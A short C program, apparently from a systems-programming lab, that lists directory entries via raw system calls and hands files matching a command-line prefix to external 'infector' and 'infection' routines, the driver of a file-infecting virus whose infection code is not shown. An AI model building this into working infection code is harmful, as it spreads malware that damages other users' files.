#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <dirent.h>  // Standard directory handling header
#include <errno.h>
#include <stdlib.h>
#include <string.h>  // For strlen
#include <stdio.h>  // For printf
#include "util.h"  // For stnmp

#define BUF_SIZE 8192
#define EXIT_ERROR 0x55
#define OPEN_FLAGS (O_RDONLY | O_DIRECTORY)
#define WRITE 4

extern int system_call();
extern void infection();
extern void infector(char* prefix);

struct linux_dirent {
    long           d_ino;
    off_t          d_off;
    unsigned short d_reclen;
    char           d_name[];
};


int main(int argc, char *argv[]) {
    int fd = open(".", O_RDONLY | O_DIRECTORY);  // Open the current directory
    if (fd < 0) {
       system_call(SYS_exit, EXIT_ERROR, 0, 0);  // Use syscall directly
    }

    char buf[BUF_SIZE];
    int nread = syscall(SYS_getdents, fd, buf, BUF_SIZE);  // Read the directory entries
    if (nread < 0) {
        close(fd);
        system_call(SYS_exit, EXIT_ERROR, 0, 0);  // Handle error
    }
    int bpos;
    for (bpos = 0; bpos < nread;) {
        struct linux_dirent *d = (struct linux_dirent *)(buf + bpos);  // Cast to struct linux_dirent

        if (d->d_name[0] != '\0') {  // Ensure the name is not empty
            system_call(WRITE,STDOUT_FILENO, d->d_name, strlen(d->d_name));  // Write the filename
            system_call(WRITE,STDOUT_FILENO, "\n", 1);  // Print a newline
        }

     if (argc > 1 && strncmp(argv[1], "-a", 2) == 0) {
        if (strlen(argv[1]) > 2) {  // Ensure there's something after "-a"
        char *prefix = argv[1] + 2;  // Extract prefix after -a
        if (d != NULL && strncmp(prefix, d->d_name, strlen(prefix)) == 0) {
            infector(prefix); // Call function with the extracted prefix
        }
    }
}
        bpos += d->d_reclen;  // Move to the next record in the buffer
    }

    close(fd);  // Close the directory file descriptor
    infection();

    return 0;
}
